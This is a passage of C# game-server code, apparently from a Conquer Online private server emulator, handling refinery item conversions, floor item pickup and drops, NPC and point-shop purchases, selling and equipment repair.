                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Breakthrough - Bow
                case 723666:
                case 723667:
                case 723668:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 793;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Breakthrough - Ring
                case 724198:
                case 724199:
                case 724200:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 266;
                        if (newItemID >= 724466)
                            newItemID += 4;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                #region Counteraction - Armor
                case 724142:
                case 724143:
                case 724144:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 331;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Counteraction - Bag
                case 724207:
                case 724208:
                case 724209:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 161;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Counteraction - Necklace
                case 724204:
                case 724205:
                case 724206:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 274;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                #region Immunity - Boots
                case 724210:
                case 724211:
                case 724212:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 225;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region Immunity - Armor
                case 724136:
                case 724137:
                case 724138:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 294;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                #region Intensification - Headgear
                case 724139:
                case 724140:
                case 724141:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 301;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                #region M-Defense - Necklace
                case 725160:
                case 725161:
                case 725162:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 32;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region M-Defense - Bag
                case 725163:
                case 725164:
                case 725165:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 34;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region M-Defense - Bracelet
                case 725166:
                case 725167:
                case 725168:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 36;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion
                #region M-Defense - Ring
                case 725169:
                case 725170:
                case 725171:
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.RemoveFromStack);
                        byte extra = GetNextRefineryItem();
                        uint newItemID = item.ID + extra + 38;
                        if (item.Bound)
                            client.Inventory.AddBound(newItemID, 0, 1);
                        else
                            client.Inventory.Add(newItemID, 0, 1);
                        break;
                    }
                #endregion

                case 724130:
                case 724131:
                case 724132:
                case 724133:
                case 724134:
                case 724135:
                case 724151:
                case 724152:
                case 724153:
                case 724154:
                case 724155:
                case 724156:
                case 724157:
                case 724158:
                case 724159:
                case 724160:
                case 724161:
                case 724162:
                case 724163:
                case 724164:
                case 724165:
                case 724166:
                case 724167:
                case 724168:
                case 724169:
                case 724170:
                case 724171:
                case 724172:
                case 724173:
                case 724174:
                case 724175:
                case 724176:
                case 724177:
                case 724178:
                case 724179:
                case 724180:
                case 724181:
                case 724182:
                case 724183:
                case 724184:
                case 724185:
                case 724186:
                case 724190:
                case 724191:
                case 724192:
                case 725055:
                case 725056:
                case 725057:
                case 725058: GainRefineryItem(item, client); break;
                    #endregion
            }
        }
        public static byte GetNextRefineryItem()
        {
            if (Kernel.Rate(10))
                return 2;
            else if (Kernel.Rate(30))
                return 1;
            return 0;
        }
        public static void GainRefineryItem(ConquerItem item, GameState c)
        {
            Refinery.RefineryBoxes RefineryB = null;
            if (Kernel.DatabaseRefineryBoxes.TryGetValue(item.ID, out RefineryB))
            {
                List<Refinery.RefineryItem> Possible = new List<Refinery.RefineryItem>();
                foreach (Refinery.RefineryItem RefineryI in Kernel.DatabaseRefinery.Values)
                {
                    if (RefineryI.Type == RefineryB.Type)
                    {
                        if (RefineryI.Position == RefineryB.Position)
                        {
                            if (RefineryI.Untradable == RefineryB.Untradable)
                                Possible.Add(RefineryI);
                        }
                    }
                }
                if (Possible.Count > 0)
                {
                    Random Rand = new Random();
                    Int32 x = Math.Max(Rand.Next(1, Possible.Count), Possible.Count - 1);
                    Refinery.RefineryItem Refinery = Possible[x];
                    if (Refinery != null)
                    {
                        c.Inventory.Remove(item, Game.Enums.ItemUse.Remove);

                        ConquerItem i = new ConquerItem(true);
                        i.ID = Refinery.Identifier;
                        c.Inventory.Add(i, Game.Enums.ItemUse.CreateAndAdd);
                    }
                }
            }
        }
        private static void PickupItem(FloorItem floorItem, GameState client)
        {
            FloorItem item;
            if ((!client.Screen.TryGetFloorItem(floorItem.UID, out floorItem) || client.Trade.InTrade) || ((client.Entity.X != floorItem.X) || (client.Entity.Y != floorItem.Y)))
            {
                return;
            }
            uint uID = (floorItem.Owner == null) ? 0 : floorItem.Owner.Entity.UID;
            if ((((uID == 0) || (uID != client.Entity.UID)) && (uID != 0)) && (Time32.Now < floorItem.OnFloor.AddSeconds(10)))
            {
                if ((client.Team != null) && client.Team.IsTeammate(uID))
                {
                    if (client.Team.PickupItems && (floorItem.ValueType == FloorItem.FloorValueType.Item))
                    {
                        if ((floorItem.ItemID != 0x109a00) && (floorItem.ItemID != 0x109a01))
                        {
                            goto Label_0154;
                        }
                    }
                    else if (client.Team.PickupMoney && (floorItem.ValueType != FloorItem.FloorValueType.Item))
                    {
                        goto Label_0154;
                    }
                }
                client.Send(Constants.FloorItemNotAvailable);
                return;
            }
        Label_0154:
            item = new FloorItem(true);
            if (floorItem.ValueType != FloorItem.FloorValueType.Item)
            {
                client.Map.RemoveFloorItem(floorItem);
            }
            item.Type = 3;
            item.UID = client.Entity.UID;
            item.X = client.Entity.X;
            item.Y = client.Entity.Y;
            switch (floorItem.ValueType)
            {
                case FloorItem.FloorValueType.Item:
                    if (client.Inventory.Count > 0x27)
                    {
                        client.Send(Constants.FullInventory);
                        return;
                    }
                    client.SendScreen(item, false);
                    floorItem.Type = 2;
                    client.RemoveScreenSpawn(floorItem, true);
                    client.Map.RemoveFloorItem(floorItem);
                    if (MTA.Database.ConquerItemInformation.BaseInformations.ContainsKey(floorItem.Item.ID))
                        client.Send(Constants.PickupItem(MTA.Database.ConquerItemInformation.BaseInformations[floorItem.Item.ID].Name));
                    foreach (GameState state in Kernel.GamePool.Values)
                    {
                        state.Screen.Remove(floorItem);
                    }
                    if (floorItem.Item.MobDropped)
                    {
                        Database.ConquerItemInformation iteminfo = new Database.ConquerItemInformation(floorItem.Item.ID, floorItem.Item.Plus);

                        // client.Inventory.Add(floorItem.Item, Enums.ItemUse.CreateAndAdd);
                        if (iteminfo.BaseInformation.StackSize == 0)
                        {
                            client.Inventory.Add(floorItem.Item, Game.Enums.ItemUse.CreateAndAdd);
                        }
                        else
                        {
                            ConquerItem _ExistingItem;
                            if (client.Inventory.GetStackContainer(iteminfo.BaseInformation.ID, iteminfo.BaseInformation.StackSize, 1, out _ExistingItem))
                            {
                                _ExistingItem.StackSize++;
                                Database.ConquerItemTable.UpdateStack(_ExistingItem);
                                _ExistingItem.Mode = Game.Enums.ItemMode.Update;
                                _ExistingItem.Send(client);
                            }
                            else
                            {
                                floorItem.Item.StackSize = 1;
                                client.Inventory.Add(floorItem.Item, Game.Enums.ItemUse.CreateAndAdd);
                            }
                        }
                        //Data data = new Data(true);
                        //data.ID = Data.OpenCustom;
                        //data.UID = client.Entity.UID;
                        //data.TimeStamp = Time32.Now;
                        //data.dwParam = 3382;
                        //data.wParam1 = client.Entity.X;
                        //data.wParam2 = client.Entity.Y;
                        //client.Send(data);
                    }
                    else
                    {
                        client.Inventory.Add(floorItem.Item, Enums.ItemUse.Add);
                        //Data data = new Data(true);
                        //data.ID = Data.OpenCustom;
                        //data.UID = client.Entity.UID;
                        //data.TimeStamp = Time32.Now;
                        //data.dwParam = 3382;
                        //data.wParam1 = client.Entity.X;
                        //data.wParam2 = client.Entity.Y;
                        //client.Send(data);
                    }
                    return;

                case FloorItem.FloorValueType.Money:
                    client.Send(Constants.PickupGold(floorItem.Value));
                    client.SendScreen(item, false);
                    client.Entity.Money += floorItem.Value;
                    floorItem.Type = 2;
                    client.RemoveScreenSpawn(floorItem, true);
                    return;

                case FloorItem.FloorValueType.ConquerPoints:
                    client.Send(Constants.PickupConquerPoints(floorItem.Value));
                    client.SendScreen(item, false);
                    client.Entity.ConquerPoints += floorItem.Value;// Math.Min(floorItem.Value, 300);
                    floorItem.Type = 2;
                    client.RemoveScreenSpawn(floorItem, true);
                    return;
            }
        }
        static void DropItem(ItemUsage itemUsage, Client.GameState client)
        {
            ConquerItem item = null;
            if (client.Inventory.TryGetItem(itemUsage.UID, out item))
            {
                if (item.ID == 0)
                    return;
                Database.ConquerItemInformation infos = new Database.ConquerItemInformation(item.ID, 0);
                if (item.Lock != 0 || item.Suspicious)
                    return;
                if (item.ID == 729611 || item.ID == 729612 || item.ID == 729613 || item.ID == 729614 || item.ID == 729703)
                {
                    client.SpiritBeadQ.Reset();
                    client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                    return;
                }
                if (infos.BaseInformation.Type == Database.ConquerItemBaseInformation.ItemType.Dropable && !item.Bound)
                {
                    ushort X = client.Entity.X, Y = client.Entity.Y;
                    if (client.Map.SelectCoordonates(ref X, ref Y))
                    {
                        FloorItem floorItem = new FloorItem(true);
                        floorItem.Item = item;
                        if (!item.Purification.Available)
                        {

                            floorItem.ItemID = item.ID;
                            floorItem.ItemColor = item.Color;

                        }
                        else
                        {

                            floorItem.ItemID = item.Purification.PurificationItemID;
                        }
                        floorItem.MapID = client.Map.ID;
                        floorItem.MapObjType = Game.MapObjectType.Item;
                        floorItem.X = X;
                        floorItem.Y = Y;
                        floorItem.Type = FloorItem.Drop;
                        floorItem.OnFloor = Time32.Now;
                        floorItem.UID = FloorItem.FloorUID.Next;
                        while (client.Map.Npcs.ContainsKey(floorItem.UID))
                            floorItem.UID = FloorItem.FloorUID.Next;
                        client.SendScreenSpawn(floorItem, true);
                        client.Map.AddFloorItem(floorItem);
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        Program.AddDropLog(client.Entity.Name, floorItem.Item);

                    }
                }
                else
                    client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
            }
        }
        static void DropMoney(ItemUsage itemUsage, Client.GameState client)
        {
            if (client.Entity.Money >= itemUsage.UID)
            {
                ushort X = client.Entity.X, Y = client.Entity.Y;
                if (client.Map.SelectCoordonates(ref X, ref Y))
                {
                    uint ItemID = MoneyItemID(itemUsage.UID);
                    FloorItem floorItem = new FloorItem(true);
                    floorItem.ValueType = FloorItem.FloorValueType.Money;
                    floorItem.Value = itemUsage.UID;
                    floorItem.ItemID = ItemID;
                    floorItem.MapID = client.Map.ID;
                    floorItem.MapObjType = Game.MapObjectType.Item;
                    floorItem.X = X;
                    floorItem.Y = Y;
                    floorItem.Type = FloorItem.Drop;
                    floorItem.OnFloor = Time32.Now;
                    floorItem.UID = FloorItem.FloorUID.Next;
                    while (client.Map.Npcs.ContainsKey(floorItem.UID))
                        floorItem.UID = FloorItem.FloorUID.Next;
                    client.SendScreenSpawn(floorItem, true);
                    client.Map.AddFloorItem(floorItem);
                    client.Entity.Money -= itemUsage.UID;

                }
            }
        }
        public static uint MoneyItemID(uint value)
        {
            if (value < 100)
                return 1090000;
            else if (value < 399)
                return 1090010;
            else if (value < 5099)
                return 1090020;
            else if (value < 8099)
                return 1091000;
            else if (value < 12099)
                return 1091010;
            else
                return 1091020;
        }

        static void HandleBuyFromNPC(ItemUsage itemUsage, Client.GameState client)
        {
            if (client == null) return;
            if (itemUsage == null) return;

            if (client.Trade.InTrade) return;

            #region Honor shop
            if (itemUsage.UID == Database.HonorShop.UID)
            {
                var shop = Database.HonorShop.Shop;
                uint cost;
                if (shop.Items.TryGetValue(itemUsage.dwParam, out cost))
                {
                    if (client.Inventory.Count <= 39)
                    {
                        if (client.CurrentHonor >= cost)
                        {
                            ConquerItem newItem = new GamePackets.ConquerItem(true);
                            newItem.ID = itemUsage.dwParam;
                            Database.ConquerItemBaseInformation ibi;
                            if (Database.ConquerItemInformation.BaseInformations.TryGetValue(newItem.ID, out ibi))
                            {
                                if (ibi.Durability > 0)
                                {
                                    newItem.Durability = ibi.Durability;
                                    newItem.MaximDurability = ibi.Durability;
                                }
                            }
                            newItem.Bound = true;
                            client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);
                            client.CurrentHonor -= cost;
                            client.ArenaStatistic.Send(client);
                        }
                        else client.Send(new Message("You do not have enough Honor Points", Color.Red, Message.TopLeft));
                    }
                    else client.Send(new Message("You do not have enough space in your inventory", Color.Red, Message.TopLeft));
                }
                else client.Send(new Message("Can not find this item", Color.Red, Message.TopLeft));
                return;
            }
            #endregion
            #region Champion shop
            if (itemUsage.UID == Database.ChampionShop.UID)
            {
                Database.ChampionShop.ChampionItem item;
                if (Database.ChampionShop.Shop.Items.TryGetValue(itemUsage.dwParam, out item))
                {
                    if (client.ChampionStats != null)
                    {
                        if (client.Inventory.Count <= 39)
                        {
                            if (client.ChampionStats.Points >= item.Price)
                            {
                                ConquerItem newItem = new GamePackets.ConquerItem(true);
                                newItem.ID = itemUsage.dwParam;
                                Database.ConquerItemBaseInformation ibi;
                                if (Database.ConquerItemInformation.BaseInformations.TryGetValue(newItem.ID, out ibi))
                                {
                                    if (ibi.Durability > 0)
                                    {
                                        newItem.Durability = ibi.Durability;
                                        newItem.MaximDurability = ibi.Durability;
                                    }
                                }
                                if (ibi != null)
                                    if (ibi.Name.Contains("Stone"))
                                        newItem.Plus = (byte)(newItem.ID % 10);
                                newItem.Bound = item.Bound;
                                client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);

                                client.ChampionStats.Points -= item.Price;
                                client.ChampionStats.Send(client);
                            }
                            else client.Send(new Message("You do not have enough Champion Points", Color.Red, Message.TopLeft));
                        }
                        else client.Send(new Message("You do not have enough space in your inventory", Color.Red, Message.TopLeft));
                    }
                }
                else client.Send(new Message("Can not find this item", Color.Red, Message.TopLeft));
                return;
            }
            #endregion
            #region Race point shop
            if (itemUsage.UID == Database.RacePointShop.UID)
            {
                Database.RacePointShop.RacePointItem item;
                if (Database.RacePointShop.Shop.Items.TryGetValue(itemUsage.dwParam, out item))
                {
                    if (client.Inventory.Count <= 39)
                    {
                        if (client.RacePoints >= item.Price)
                        {
                            ConquerItem newItem = new GamePackets.ConquerItem(true);
                            newItem.ID = itemUsage.dwParam;
                            Database.ConquerItemBaseInformation ibi;
                            if (Database.ConquerItemInformation.BaseInformations.TryGetValue(newItem.ID, out ibi))
                            {
                                if (ibi.Durability > 0)
                                {
                                    newItem.Durability = ibi.Durability;
                                    newItem.MaximDurability = ibi.Durability;
                                }
                            }
                            client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);

                            client.RacePoints -= item.Price;
                        }
                        else client.Send(new Message("You do not have enough Champion Points", Color.Red, Message.TopLeft));
                    }
                    else client.Send(new Message("You do not have enough space in your inventory", Color.Red, Message.TopLeft));
                }
                else client.Send(new Message("Can not find this item", Color.Red, Message.TopLeft));
                return;
            }
            #endregion

            Interfaces.INpc npc = null;
            if (client.Map.Npcs.TryGetValue(itemUsage.UID, out npc) || itemUsage.UID == 2888)
            {
                if (client.Account.State == MTA.Database.AccountTable.AccountState.GM || client.Account.State == MTA.Database.AccountTable.AccountState.GM)
                    client.Send(new Message("This Shop ID : [" + itemUsage.UID + "]", System.Drawing.Color.Red, Message.TopLeft));

                ConquerItem _ExistingItem;
                Database.ConquerItemInformation iteminfo = new Database.ConquerItemInformation(itemUsage.dwParam, 0);
                if (client.Inventory.Count == 40 && !client.Inventory.Contains(iteminfo.BaseInformation.ID, iteminfo.BaseInformation.StackSize, out _ExistingItem))
                    return;
                if (itemUsage.UID != 2888)
                    if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, npc.X, npc.Y) > 17)
                        return;
                Database.ShopFile.Shop shop = new Database.ShopFile.Shop();
                if (!Database.ShopFile.Shops.TryGetValue(itemUsage.UID, out shop))
                    if (!Database.EShopFile.Shops.TryGetValue(itemUsage.UID, out shop))
                        shop = null;
                if (shop != null && shop.UID != 0)
                {
                    if (!shop.Items.Contains(itemUsage.dwParam))
                    {
                        //MTA.Console.WriteLine("Error! Cannot puchase item ID: " + itemUsage.dwParam + " from shop ID: " + itemUsage.UID);
                        NpcReply npcx = new NpcReply(6, "Ops. Error, You cannot buy this item may be Lucky prevented this item.")
                        {
                            OptionID = 255
                        };
                        client.Send(npcx.ToArray());
                        return;

                    }
                    uint Amount = itemUsage.dwExtraInfo > 0 ? itemUsage.dwExtraInfo : 1;

                    ConquerItem item = new ConquerItem(true);

                    switch (shop.MoneyType)
                    {
                        case MTA.Database.ShopFile.MoneyType.Gold:
                            {
                                if (iteminfo.BaseInformation.GoldWorth * Amount > client.Entity.Money)
                                    return;
                                if (client.Entity.Money - (iteminfo.BaseInformation.GoldWorth * Amount) > client.Entity.Money)
                                    return;
                                item.ID = itemUsage.dwParam;
                                item.Durability = item.MaximDurability = iteminfo.BaseInformation.Durability;
                                item.Color = (MTA.Game.Enums.Color)3;

                                uint NewAmount = itemUsage.dwExtraInfo > 0 ? itemUsage.dwExtraInfo : 1;
                                while (NewAmount > 0)
                                {
                                    if (iteminfo.BaseInformation.StackSize == 0)
                                    {
                                        item = new ConquerItem(true);
                                        item.ID = itemUsage.dwParam;
                                        item.Durability = item.MaximDurability = iteminfo.BaseInformation.Durability;
                                        item.Color = (MTA.Game.Enums.Color)3;
                                        client.Inventory.Add(item, Game.Enums.ItemUse.CreateAndAdd);
                                        item.MaxStackSize = item.StackSize = 1;
                                        NewAmount--;
                                    }
                                    else
                                    {
                                        if (client.Inventory.GetStackContainer(iteminfo.BaseInformation.ID, iteminfo.BaseInformation.StackSize, 1, out _ExistingItem))
                                        {
                                            _ExistingItem.StackSize++;

                                            Database.ConquerItemTable.UpdateStack(_ExistingItem);
                                            _ExistingItem.Mode = Game.Enums.ItemMode.Update;
                                            _ExistingItem.Send(client);
                                            NewAmount -= 1;
                                        }
                                        else
                                        {
                                            item = new ConquerItem(true);
                                            item.ID = itemUsage.dwParam;
                                            item.Durability = item.MaximDurability = iteminfo.BaseInformation.Durability;
                                            item.Color = (MTA.Game.Enums.Color)3;
                                            item.MaxStackSize = iteminfo.BaseInformation.StackSize;
                                            item.StackSize = 1;
                                            if (NewAmount >= item.MaxStackSize)
                                            {
                                                item.StackSize = item.MaxStackSize;
                                                NewAmount -= item.StackSize;
                                            }
                                            else
                                            {
                                                item.StackSize = (ushort)NewAmount;
                                                NewAmount = 0;
                                            }
                                            client.Inventory.Add(item, Game.Enums.ItemUse.CreateAndAdd);
                                            Database.ConquerItemTable.UpdateStack(item);
                                        }
                                    }
                                }
                                client.Entity.Money -= (iteminfo.BaseInformation.GoldWorth * Amount);
                                break;
                            }
                        case MTA.Database.ShopFile.MoneyType.ConquerPoints:
                            {
                                if (itemUsage.dwExtraInfo3 == 2)
                                {
                                    if (iteminfo.BaseInformation.ConquerPointsWorth * Amount > client.Entity.BoundCps)
                                        return;
                                    if (client.Entity.BoundCps - (iteminfo.BaseInformation.ConquerPointsWorth * Amount) > client.Entity.BoundCps)
                                        return;
                                    item.ID = itemUsage.dwParam;
                                    if (item.ID % 730000 <= 12)
                                        item.Plus = (Byte)(item.ID % 730000);
                                    item.Color = (MTA.Game.Enums.Color)Kernel.Random.Next(4, 8);
                                    item.Durability = item.MaximDurability = iteminfo.BaseInformation.Durability;
                                    uint NewAmount = itemUsage.dwExtraInfo > 0 ? itemUsage.dwExtraInfo : 1;
                                    while (NewAmount > 0)
                                    {
                                        if (iteminfo.BaseInformation.StackSize == 0)
                                        {
                                            if ((itemUsage.dwParam % 730000) <= 12)
                                            {
                                                ConquerItem newItem = new GamePackets.ConquerItem(true);
                                                newItem.ID = itemUsage.dwParam;
                                                newItem.Plus = (Byte)(newItem.ID % 730000);
                                                client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);
                                            }
                                            else
                                            {
                                                item = new ConquerItem(true);
                                                item.ID = itemUsage.dwParam;
                                                item.Durability = item.MaximDurability = iteminfo.BaseInformation.Durability;
                                                item.Color = (MTA.Game.Enums.Color)3;
                                                client.Inventory.Add(item, Game.Enums.ItemUse.CreateAndAdd);
                                            }
                                            item.MaxStackSize = item.StackSize = 1;
                                            NewAmount--;
                                        }
                                        else
                                        {
                                            if (client.Inventory.GetStackContainer(iteminfo.BaseInformation.ID, iteminfo.BaseInformation.StackSize, 1, out _ExistingItem))
                                            {
                                                _ExistingItem.StackSize++;

                                                Database.ConquerItemTable.UpdateStack(_ExistingItem);
                                                _ExistingItem.Mode = Game.Enums.ItemMode.Update;
                                                _ExistingItem.Send(client);
                                                NewAmount -= 1;
                                            }
                                            else
                                            {
                                                item = new ConquerItem(true);
                                                item.ID = itemUsage.dwParam;
                                                item.Durability = item.MaximDurability = iteminfo.BaseInformation.Durability;
                                                item.Color = (MTA.Game.Enums.Color)3;
                                                item.MaxStackSize = iteminfo.BaseInformation.StackSize;
                                                item.StackSize = 1;
                                                if (NewAmount >= item.MaxStackSize)
                                                {
                                                    item.StackSize = item.MaxStackSize;
                                                    NewAmount -= item.StackSize;
                                                }
                                                else
                                                {
                                                    item.StackSize = (ushort)NewAmount;
                                                    NewAmount = 0;
                                                }
                                                client.Inventory.Add(item, Game.Enums.ItemUse.CreateAndAdd);
                                                Database.ConquerItemTable.UpdateStack(item);
                                            }
                                        }
                                    }
                                    client.Entity.BoundCps -= (iteminfo.BaseInformation.ConquerPointsWorth * Amount);
                                    break;
                                }
                                else
                                {
                                    if (iteminfo.BaseInformation.ConquerPointsWorth * Amount > client.Entity.ConquerPoints)
                                        return;
                                    if (client.Entity.ConquerPoints - (iteminfo.BaseInformation.ConquerPointsWorth * Amount) > client.Entity.ConquerPoints)
                                        return;
                                    item.ID = itemUsage.dwParam;
                                    if (item.ID % 730000 <= 12)
                                        item.Plus = (Byte)(item.ID % 730000);
                                    item.Color = (MTA.Game.Enums.Color)Kernel.Random.Next(4, 8);
                                    item.Durability = item.MaximDurability = iteminfo.BaseInformation.Durability;
                                    uint NewAmount = itemUsage.dwExtraInfo > 0 ? itemUsage.dwExtraInfo : 1;
                                    while (NewAmount > 0)
                                    {
                                        if (iteminfo.BaseInformation.StackSize == 0)
                                        {
                                            if ((itemUsage.dwParam % 730000) <= 12)
                                            {
                                                ConquerItem newItem = new GamePackets.ConquerItem(true);
                                                newItem.ID = itemUsage.dwParam;
                                                newItem.Plus = (Byte)(newItem.ID % 730000);
                                                client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);
                                            }
                                            else
                                            {
                                                item = new ConquerItem(true);
                                                item.ID = itemUsage.dwParam;
                                                item.Durability = item.MaximDurability = iteminfo.BaseInformation.Durability;
                                                item.Color = (MTA.Game.Enums.Color)3;
                                                client.Inventory.Add(item, Game.Enums.ItemUse.CreateAndAdd);
                                            }
                                            item.MaxStackSize = item.StackSize = 1;
                                            NewAmount--;
                                        }
                                        else
                                        {
                                            if (client.Inventory.GetStackContainer(iteminfo.BaseInformation.ID, iteminfo.BaseInformation.StackSize, 1, out _ExistingItem))
                                            {
                                                _ExistingItem.StackSize++;

                                                Database.ConquerItemTable.UpdateStack(_ExistingItem);
                                                _ExistingItem.Mode = Game.Enums.ItemMode.Update;
                                                _ExistingItem.Send(client);
                                                NewAmount -= 1;
                                            }
                                            else
                                            {
                                                item = new ConquerItem(true);
                                                item.ID = itemUsage.dwParam;
                                                item.Durability = item.MaximDurability = iteminfo.BaseInformation.Durability;
                                                item.Color = (MTA.Game.Enums.Color)3;
                                                item.MaxStackSize = iteminfo.BaseInformation.StackSize;
                                                item.StackSize = 1;
                                                if (NewAmount >= item.MaxStackSize)
                                                {
                                                    item.StackSize = item.MaxStackSize;
                                                    NewAmount -= item.StackSize;
                                                }
                                                else
                                                {
                                                    item.StackSize = (ushort)NewAmount;
                                                    NewAmount = 0;
                                                }
                                                client.Inventory.Add(item, Game.Enums.ItemUse.CreateAndAdd);
                                                Database.ConquerItemTable.UpdateStack(item);
                                            }
                                        }
                                    }
                                    client.Entity.ConquerPoints -= (iteminfo.BaseInformation.ConquerPointsWorth * Amount);
                                    break;
                                }

                            }
                    }
                }
            }
        }

        static void HandleSellToNPC(ItemUsage itemUsage, Client.GameState client)
        {
            Interfaces.INpc npc = null;
            if (client.Map.Npcs.TryGetValue(itemUsage.UID, out npc))
            {
                if (Kernel.GetDistance(client.Entity.X, client.Entity.Y, npc.X, npc.Y) > 17)
                    return;
                ConquerItem item = null;
                if (client.Inventory.TryGetItem(itemUsage.dwParam, out item))
                {
                    if (item.Lock != 0 || item.Suspicious)
                        return;
                    uint Price = new Database.ConquerItemInformation(item.ID, 0).BaseInformation.GoldWorth;
                    Price = Price / 3;
                    if (item.Durability > 0 && item.Durability < item.MaximDurability)
                        Price = (Price * item.Durability) / item.MaximDurability;

                    if (item.Durability > 0 && item.Durability <= item.MaximDurability)
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                        if (!(client.Account.State == MTA.Database.AccountTable.AccountState.GM || client.Account.State == Database.AccountTable.AccountState.DoesntExist || client.Entity.VIPLevel >= 6))
                        {
                            client.MessageBox("Only Vip Players(vip > 6) Can get money for selling items");
                            return;
                        }
                        client.Entity.Money += Price;
                    }
                    else
                    {
                        client.Inventory.Remove(item, Game.Enums.ItemUse.Remove);
                    }
                }
            }
        }
        static void HandleVIPRepair(ItemUsage itemUsage, Client.GameState client)
        {
            foreach (var item in client.Equipment.Objects)
            {
                if (item != null)
                {
                    if (item.Durability != 0 && item.Durability != item.MaximDurability)
                    {
                        if (item.Suspicious)
                            return;
                        if (IsFranko(item.ID))
                            return;
                        var info = new Database.ConquerItemInformation(item.ID, 0).BaseInformation;
                        if (item.Durability > 0 && item.Durability < info.Durability)
                        {
                            uint Price = info.GoldWorth;
                            byte Quality = (byte)(item.ID % 10);
                            double QualityMultipier = 0;

                            switch (Quality)
                            {
                                case 9: QualityMultipier = 1.125; break;
                                case 8: QualityMultipier = 0.975; break;
                                case 7: QualityMultipier = 0.9; break;
                                case 6: QualityMultipier = 0.825; break;
                                default: QualityMultipier = 0.75; break;
                            }

                            int nRepairCost = 0;
                            if (Price > 0)
                                nRepairCost = (int)Math.Ceiling((Price * (info.Durability - item.Durability) / info.Durability) * QualityMultipier);

                            nRepairCost = Math.Max(1, nRepairCost);
                            if (client.Entity.Money >= (uint)nRepairCost)
                            {
                                client.Entity.Money -= (uint)nRepairCost;
                                item.Durability = item.MaximDurability = info.Durability;
                                item.Mode = Game.Enums.ItemMode.Update;
                                item.Send(client);
                            }
                            else
                            {
                                client.Send(new NpcReply(NpcReply.MessageBox, "You did not have enough money to fix your items!"));
                                break;
                            }
                        }
                    }
                }
            }
        }
        static void HandleRepair(ItemUsage itemUsage, Client.GameState client)
        {
            ConquerItem item = null;
            if (client.Inventory.TryGetItem(itemUsage.UID, out item))
            {
                if (item.Suspicious)
                    return;
                if (IsFranko(item.ID))
                    return;
                if (item.Durability > 0 && item.Durability < item.MaximDurability)
                {
                    uint Price = new Database.ConquerItemInformation(item.ID, 0).BaseInformation.GoldWorth;
                    byte Quality = (byte)(item.ID % 10);
                    double QualityMultipier = 0;

                    switch (Quality)
                    {
                        case 9: QualityMultipier = 1.125; break;
                        case 8: QualityMultipier = 0.975; break;
